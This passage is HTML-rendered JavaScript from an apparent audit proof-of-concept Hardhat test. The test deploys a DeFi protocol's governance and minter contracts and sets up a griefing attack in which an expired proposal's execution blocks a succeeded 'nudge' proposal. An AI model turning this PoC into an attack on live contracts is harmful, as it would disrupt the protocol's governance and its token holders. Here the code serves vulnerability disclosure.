class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeManager.connect(deployer).setBribeFactory(bribeFactoryV3.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  BribeFactoryV3 (proxy) deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const MinterUpgradeableContract = await ethers.getContractFactory(\u0026quot;MinterUpgradeable\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        minterUpgradeable = await upgrades.deployProxy(MinterUpgradeableContract, [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            gaugeManager.address, votingEscrow.address, rewardsDistributor.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ], { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            initializer: \u0026#39;initialize\u0026#39;, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            kind: \u0026#39;transparent\u0026#39;, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            unsafeAllow: [\u0026#39;constructor\u0026#39;] \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minterUpgradeable.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  MinterUpgradeable (proxy) deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(deployer).setMinter(minterUpgradeable.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Black token minter changed to MinterUpgradeable.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const BlackGovernorContract = await ethers.getContractFactory(\u0026quot;BlackGovernor\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        blackGovernor = await BlackGovernorContract.deploy(votingEscrow.address, minterUpgradeable.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackGovernor.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackGovernor.connect(deployer).setTeam(teamEOA.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Set proposalNumerator to 0 to simplify threshold debugging for now\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackGovernor.connect(teamEOA).setProposalNumerator(0); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  BlackGovernor deployed and proposalNumerator set to 0.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minterUpgradeable.connect(deployer).setGaugeManager(gaugeManager.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minterUpgradeable.connect(deployer).setRewardDistributor(rewardsDistributor.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeManager.connect(deployer).setMinter(minterUpgradeable.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeManager.connect(deployer).setBlackGovernor(blackGovernor.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await rewardsDistributor.connect(deployer).setDepositor(minterUpgradeable.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const MinterInterface = MinterUpgradeableContract.interface; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        nudgeCalldata = MinterInterface.encodeFunctionData(\u0026quot;nudge\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Preparing proposer and voters...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const smNFTValueForProposer = ethers.utils.parseEther(\u0026quot;2000\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const smNFTLockValueForVoters = ethers.utils.parseEther(\u0026quot;500\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const lockDuration = CONTRACT_WEEK * 104; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(deployer).transfer(proposerEOA.address, smNFTValueForProposer); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(deployer).transfer(smVoter1EOA.address, smNFTLockValueForVoters);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(deployer).transfer(smVoter2EOA.address, smNFTLockValueForVoters);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(proposerEOA).approve(votingEscrow.address, smNFTValueForProposer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(proposerEOA).create_lock(smNFTValueForProposer, lockDuration, true); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Proposer smNFT lock created.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(smVoter1EOA).approve(votingEscrow.address, smNFTLockValueForVoters);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(smVoter1EOA).create_lock(smNFTLockValueForVoters, lockDuration, true); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  smVoter1 smNFT created.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(smVoter2EOA).approve(votingEscrow.address, smNFTLockValueForVoters);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(smVoter2EOA).create_lock(smNFTLockValueForVoters, lockDuration, true); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  smVoter2 smNFT created.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const endOfBeforeEachTimestamp = (await ethers.provider.getBlock(\u0026quot;latest\u0026quot;)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const proposerSMNFTVotesAtSetupEnd = await votingEscrow.getsmNFTPastVotes(proposerEOA.address, endOfBeforeEachTimestamp);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  End of beforeEach: Proposer smNFT Votes (current ts): ${ethers.utils.formatEther(proposerSMNFTVotesAtSetupEnd)} BLACK`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const veTotalSupplyAtSetupEnd = await votingEscrow.getPastTotalSupply(endOfBeforeEachTimestamp);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  End of beforeEach: VE TotalSupply (current ts): ${ethers.utils.formatEther(veTotalSupplyAtSetupEnd)} BLACK`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const currentThreshAtSetupEnd = await blackGovernor.proposalThreshold(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  End of beforeEach: BlackGovernor Threshold (current ts, numerator 0): ${ethers.utils.formatEther(currentThreshAtSetupEnd)} BLACK`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Advancing Minter to Tail Emission phase...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (typeof minterUpgradeable.connect(deployer)._initialize === \u0026#39;function\u0026#39;) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e             try { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                 await minterUpgradeable.connect(deployer)._initialize([], [], 0); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                 console.log(\u0026quot;  MinterUpgradeable._initialize() called or already handled.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e             } catch (e) { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                 console.log(\u0026quot;  MinterUpgradeable._initialize() likely already handled by proxy or guarded: \u0026quot;, e.message);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e             }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const TAIL_START = await minterUpgradeable.TAIL_START();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let currentWeekly = await minterUpgradeable.weekly();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let loopEpochCount = 0; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const maxEpochsForSetup = 75; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  Initial Minter weekly for tail phase: ${ethers.utils.formatEther(currentWeekly)}, TAIL_START: ${ethers.utils.formatEther(TAIL_START)}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let minterEpochCountBeforeLoop = await minterUpgradeable.epochCount();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  Minter internal epochCount before loop: ${minterEpochCountBeforeLoop.toString()}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        while(currentWeekly.gte(TAIL_START) \u0026amp;\u0026amp; loopEpochCount \u0026lt; maxEpochsForSetup) { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            const currentActivePeriodForMinter = await minterUpgradeable.active_period();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            const currentTimeForMinter = (await ethers.provider.getBlock(\u0026quot;latest\u0026quot;)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (currentTimeForMinter \u0026lt; currentActivePeriodForMinter.add(CONTRACT_WEEK)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                const timeToAdvance = currentActivePeriodForMinter.add(CONTRACT_WEEK).sub(currentTimeForMinter).toNumber() + 60;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                await advanceTime(timeToAdvance); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await minterUpgradeable.connect(deployer).update_period();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            currentWeekly = await minterUpgradeable.weekly();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            loopEpochCount++;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const finalMinterEpochCount = await minterUpgradeable.epochCount();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(currentWeekly).to.be.lt(TAIL_START, `Minter did not reach tail emission phase after ${loopEpochCount} loop iterations (Minter epoch: ${finalMinterEpochCount.toString()}). Current weekly: ${ethers.utils.formatEther(currentWeekly)}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`Minter in Tail Emission. Minter epochCount: ${finalMinterEpochCount.toString()}, Weekly: ${ethers.utils.formatEther(currentWeekly)}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;beforeEach setup complete.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    it(\u0026quot;should allow attacker to execute an Expired proposal to grief Minter.nudge() and block a Succeeded proposal\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const targets = [minterUpgradeable.address];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const values = [0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const calldatas = [nudgeCalldata]; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const descriptionExpired = \u0026quot;Prop EXPIRED - Nudge\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const descriptionSucceeded = \u0026quot;Prop SUCCEED - Nudge\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Proposing PROP_EXPIRED...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Get state for the block *before* the one `propose` will be in\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await advanceTime(1); // Ensure we are in a new block if previous tx was in same block\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const blockAboutToExpire = await ethers.provider.getBlock(\u0026quot;latest\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const timestampForGetVotesExpired = blockAboutToExpire.timestamp; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const blockNumberForGetVotesExpired = blockAboutToExpire.number;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // These calls simulate what Governor\u0026#39;s getVotes(account, block.number-1) and proposalThreshold() will do\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Note: `getVotes` in L2Governor takes blockNumber but L2GovernorVotes._getVotes uses it as timestamp\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const proposerVotesForExpiredCheck = await blackGovernor.getVotes(proposerEOA.address, blockNumberForGetVotesExpired);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const thresholdForExpiredCheck = await blackGovernor.proposalThreshold(); // Uses current block.timestamp for its internal VE call\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  Proposer EOA: ${proposerEOA.address}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  Block number for PROP_EXPIRED getVotes snapshot: ${blockNumberForGetVotesExpired}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  Proposer\u0026#39;s votes for PROP_EXPIRED (using block num as ts): ${ethers.utils.formatEther(proposerVotesForExpiredCheck)}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  Proposal Threshold for PROP_EXPIRED (using current ts): ${ethers.utils.formatEther(thresholdForExpiredCheck)}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // This expect is the key debug point\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(proposerVotesForExpiredCheck).to.be.gte(thresholdForExpiredCheck, \u0026quot;PoC PRE-CHECK FAILED: Proposer EOA votes should be \u0026gt;= threshold for PROP_EXPIRED\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let txPropExpired = await blackGovernor.connect(proposerEOA).propose(targets, values, calldatas, descriptionExpired);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let receiptPropExpired = await txPropExpired.wait();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const proposalId_Expired = receiptPropExpired.events.find(e =\u0026gt; e.event === \u0026quot;ProposalCreated\u0026quot;).args.proposalId;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const actualCreationTimestampExpired = (await ethers.provider.getBlock(receiptPropExpired.blockNumber)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const epochTimeHash_Expired = ethers.utils.hexZeroPad(ethers.utils.hexlify(calculateEpochNextJS(actualCreationTimestampExpired)), 32);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Proposing PROP_SUCCEED...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const currentEpochNextForExpired = calculateEpochNextJS(actualCreationTimestampExpired);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let timeToAdvanceForNewBTLWeek = currentEpochNextForExpired.sub(actualCreationTimestampExpired).toNumber() + 60; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (timeToAdvanceForNewBTLWeek \u0026lt;= 60) { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            timeToAdvanceForNewBTLWeek += CONTRACT_WEEK;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await advanceTime(timeToAdvanceForNewBTLWeek); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await advanceTime(1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const blockForSucceededProposal = await ethers.provider.getBlock(\u0026quot;latest\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const timestampForGetVotesSucceed = blockForSucceededProposal.timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const blockNumberForGetVotesSucceed = blockForSucceededProposal.number;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const proposerVotesForSucceedCheck = await blackGovernor.getVotes(proposerEOA.address, blockNumberForGetVotesSucceed);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const thresholdForSucceedCheck = await blackGovernor.proposalThreshold();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(proposerVotesForSucceedCheck).to.be.gte(thresholdForSucceedCheck, \u0026quot;PoC PRE-CHECK FAILED: Proposer EOA votes should be \u0026gt;= threshold for PROP_SUCCEED\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let txPropSucceed = await blackGovernor.connect(proposerEOA).propose(targets, values, calldatas, descriptionSucceeded);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let receiptPropSucceed = await txPropSucceed.wait();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const proposalId_Succeed = receiptPropSucceed.events.find(e =\u0026gt; e.event === \u0026quot;ProposalCreated\u0026quot;).args.proposalId;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const actualCreationTimestampSucceeded = (await ethers.provider.getBlock(receiptPropSucceed.blockNumber)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const epochTimeHash_Succeed = ethers.utils.hexZeroPad(ethers.utils.hexlify(calculateEpochNextJS(actualCreationTimestampSucceeded)), 32);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(epochTimeHash_Expired).to.not.equal(epochTimeHash_Succeed, \u0026quot;EpochTimeHashes for proposals must be different!\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  epochTimeHash_Expired: ${epochTimeHash_Expired}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  epochTimeHash_Succeed: ${epochTimeHash_Succeed}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 